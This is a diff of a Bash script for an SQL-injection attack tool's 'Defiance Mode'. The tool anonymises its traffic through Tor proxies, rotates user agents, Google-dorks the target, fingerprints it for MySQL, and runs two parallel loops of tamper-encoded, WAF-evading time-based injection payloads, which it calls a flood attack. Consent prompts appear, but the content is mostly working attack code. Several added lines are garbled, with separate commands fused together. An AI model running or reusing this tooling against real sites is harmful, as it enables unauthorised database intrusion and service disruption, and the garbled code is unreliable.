@@ -9,29 +9,21 @@ export ROOT_LOG_FILE="$DEFIANCE_DIR/../targetDef.log"
 
 source "$DEFIANCE_DIR/../tamper/hungry.sh"
 
-if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
-    export WORDLIST_MYSQL="$custom_wordlist"
-else
-    if [[ "$target_url" != *"?"* ]]; then
-        if [ "$nerf_mode" = "true" ]; then
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonnerfphp.txt"
-        else
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonphp.txt"
-        fi
-    else
-        if [ "$nerf_mode" = "true" ]; then
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
-        else
-            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/sqli_defiance.txt"
-        fi
-    fi
-fi
-
-# OH MY GOD, THIS FUNC. hey, this is for yk yk. See the text id u dk.
+# ================================================================
+# SAKLAR SAKRAL PEMUTUS PARALEL INTERAKTIF (ANTI-FORCE CLOSE PC)
+# ================================================================
 eexit() {
     trap - SIGINT SIGTERM EXIT
-        echo -e "\e[0;31m[-] Interrupted,\e[0m Clearing environment process tree.."
-    kill -9 -$$ 2>/dev/null
+    echo -e "\n\n\e[0;33m[\e[0m?\e[0;33m]\e[0m \e[1;33mAction Required:\e[0m Do you want to quit the session? (y/N): "
+    read -r -n 1 AHAH
+    echo "" 
+    if [[ "$AHAH" == "y" || "$AHAH" == "Y" ]]; then
+        echo -e "\e[0;31m[-] Shutdown Triggered,\e[0m Clearing environment process tree..."
+        (kill -9 -$$) 2>/dev/null
+    else
+        echo -e "\e[0;32m[+] Resuming scan...\e[0m Continuing the multi vector synchronized strike."
+        trap 'eexit' SIGINT
+    fi
 }
 trap 'eexit' SIGINT
 
@@ -95,12 +87,13 @@ braindamage() {
 
 dork() {
     local dom="$1"
-    echo -e "[i] Launching Google Dorking."
+    echo -e "\e[0;34m[*]\e[0m Launching Universal Google Dorking..."
     sleep 2
 
     local gerbang=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
-if [ -n "$custom_proxy" ]; then local prx="-x $gerbang"; else local prx="--socks5-hostname 127.0.0.1:$gerbang"; fi
-local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+    if [ -n "$custom_proxy" ]; then local prx="-x $gerbang"; else local prx="--socks5-hostname 127.0.0.1:$gerbang"; fi
+    local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
+    
     local q="site:${dom} (intitle:\"login\" inurl:\"login\") OR inurl:search OR inurl:api OR inurl:v1"
     local enc=$(echo -n "$q" | curl -s -o /dev/null -w "%{url_effective}" --get --data-urlencode "q=" | cut -d'=' -f2-)
     local raw=$(curl $prx -s -m 10 -A "$samaran" "https://google.com{enc}&gbv=1")
@@ -136,8 +129,6 @@ local samaran=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
 }
 
 vector_sqli_agressor_left() {
-    local agressor_ua="Mozilla/5.0 (Linux; Android 10; Termux_Agresor_L1)"
-
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
 
@@ -162,7 +153,6 @@ vector_sqli_agressor_left() {
         fi
 
         local waf_trick=$(braindamage)
-
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"
 
         local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
@@ -176,8 +166,6 @@ vector_sqli_agressor_left() {
 }
 
 vector_sqli_agressor_right() {
-    local agressor_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64; Termux_Agresor_R2)"
-
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
 
@@ -192,7 +180,6 @@ vector_sqli_agressor_right() {
         local t6=$(appendnullbyte_engine "$t5")
         local t7=$(xor_engine "$t6")
         local defiance_tamper_path=$(weirdcomment_engine "$t7")
-
         local final_query=""
         if [[ "$defiance_tamper_path" == *"="* ]]; then
             local param_name=$(echo "$defiance_tamper_path" | cut -d'=' -f1)
@@ -203,30 +190,28 @@ vector_sqli_agressor_right() {
         fi
 
         local waf_trick=$(braindamage)
-
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m$target_url$final_query\e[0m"
 
-        local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
+local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
 
-        if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
-            echo -e "    \e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
-            echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
-        fi
-        sleep 5
-    done < "$WORDLIST_MYSQL"
+if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
+echo -e "\e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
+echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
+fi
+sleep 5
+done < "$WORDLIST_MYSQL"
 }
-
+             
 clear
 print_defiance_logo
-
 echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 1/2:\e[0m Defiance Mode fires a multivector parallel network flood."
 echo -e "Executing this mode against unauthorized infrastructures strictly violates cyber laws."
 echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Do you have explicit written consent from the target owner? (YES/no): "
 read -r legal_1
 
 if [ "$legal_1" != "YES" ]; then
-    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
-    exit 1
+echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Aborted. Unauthorized scanning is strictly illegal."
+exit 1
 fi
 
 echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m \e[1;31mLEGAL WARNING 2/2:\e[0m This tool is NOT server friendly in Defiance Mode."
@@ -235,59 +220,112 @@ echo -n -e "\e[0;33m[\e[0m?\e[0;37m]\e[0m Type \e[1;33m'I ACCEPT ALL RISKS'\e[0m
 read -r legal_2
 
 if [ "$legal_2" != "I ACCEPT ALL RISKS" ]; then
-    echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
-    exit 1
+echo -e "\n\e[0;31m[\e[0m-\e[0;37m]\e[0m Verification failed. Revert. Operation canceled."
+exit 1
 fi
-
 if [ -z "$custom_proxy" ]; then
-    echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
-    if pgrep -x "tor" >/dev/null 2>&1; then
-        echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
-    else
-        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."
-        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
-        echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
-        exit 1
-    fi
+echo -e "\n\e[0;33m[\e[0m!\e[0;37m]\e[0m Checking for TOR terminal service..."
+
+if pgrep -x "tor" >/dev/null 2>&1; then
+
+echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Tor terminal service detected as active."
+else
+echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m WARNING: Tor terminal service is not detected/running."echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Run 'tor' command in a new terminal before using Defiance Mode."
+
+echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Operation aborted due to environment mismatch."
+exit 1
+fi
 fi
 
-echo -e "\n\e[0;32m[\e[0m+\e[0;37m]\e[0m Double legal verification passed. Pre Scan targeting engine engaged."
-sleep 1
+echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Tracing target redirections."
 
+recon_port=${TOR_CIRCUITS[0]}
+
+if [ -n "$custom_proxy" ]; then 
+recon_proxy="-x $recon_port"; 
+else 
+
+recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; 
+fi
+
+final_destination_url=$(curl $recon_proxy -s -o /dev/null -w "%{url_effective}" -L "$target_url")
+
+export target_url="$final_destination_url"
+
+clean_domain=$(echo "$target_url" | sed -e 's|^[^/]//||' -e 's|/.||' -e 's|:.*||')dork "$clean_domain"dork_status=$?
+
+if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
+
+echo -e "\n[i] Analyzing paramater.."
+eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
+
+param_type=$(echo "$eye_report" | cut -d'|' -f1)
+
+if [ "$param_type" = "QUERY_PARAM" ]; then
+
+discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
+echo -e "\e[0;32m[+]\e[0m Active Query Parameters Spotted > ($discovered_keys)"
+
+elif [ "$param_type" = "PATH_PARAM" ]; then
+
+echo -e "\e[0;32m[+]\e[0m Path/Folder Parameter Spotted."
+else
+echo -e "\e[0;33m[-]\e[0m ayam.py: No parameters detected in the final URL destination."
+fi 
+fi
+
+if [ -n "$custom_wordlist" ] && [ -f "$custom_wordlist" ]; then
+
+export WORDLIST_MYSQL="$custom_wordlist"else
+
+if [[ "$target_url" != "?" ]]; then
+
+echo -e "\e[0;32m[+]\e[0m Framework Targeting: NonPHP."
+if [ "$nerf_mode" = "true" ]; then
+
+export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonnerfphp.txt"
+else
+export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nonphp.txt"
+fi
+else
+
+echo -e "\e[0;32m[+]\e[0m Targeting: Standard PHP / Query Configuration Engaged."
+
+if [ "$nerf_mode" = "true" ]; then
+export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/nerfdef.txt"
+else
+export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/sqli_defiance.txt"
+fi
+fi
+fi
 echo -e "\n\e[0;34m[\e[0m*\e[0;37m]\e[0m Performing database environment verification.."
-recon_port=${TOR_CIRCUITS}
-if [ -n "$custom_proxy" ]; then recon_proxy="-x $recon_port"; else recon_proxy="--socks5-hostname 127.0.0.1:$recon_port"; fi
 
 server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
 
 if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-    echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
-    echo -e "    Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Defiance Mode stands down to prevent structural asset wastage."
-    exit 1
+echo -e "\n\e[0;31m[\e[0m!\e[0;37m]\e[0m Target rejected, Non MySQL environment fingerprint."
+
+echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
+
+echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m Revert. Operation aborted to prevent structural asset wastage."
+exit 1
+
 else
-    echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
+
+echo -e "\e[0;32m[\e[0m+\e[0;37m]\e[0m Target environment matches MySQL compliance directives."
 fi
 sleep 1
 
 echo -e "\n\e[0;34m[\e[0mi\e[0;37m]\e[0m Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
 
-vector_sqli_agressor_left &
-pid_vector1=$!
-
-vector_sqli_agressor_right &
-pid_vector2=$!
-
-wait $pid_vector1 $pid_vector2
+vector_sqli_agressor_left & pid_vector1=$!vector_sqli_agressor_right & pid_vector2=$!wait $pid_vector1 $pid_vector2
 
 echo -e "\n\e[0;32m[\e[0m=\e[0;32m]\e[0m Attack sequence completed. Input to Defiance Log Analyst.."
 sleep 1
-
 if [ -f "$DEFIANCE_DIR/../validators/defval.py" ]; then
-    python "$DEFIANCE_DIR/../validators/defval.py"
+python "$DEFIANCE_DIR/../validators/defval.py"
 else
-    echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping validate."
+echo -e "\e[0;33m[\e[0m-\e[0;37m]\e[0m validators/defval.py not found. Skipping validate."
 fi
 
 echo ""
-echo -e "\e[0;32m[\e[0m=\e[0;32m]\e[0m Ending  Sequence. ImCurvin' 1.2.0."
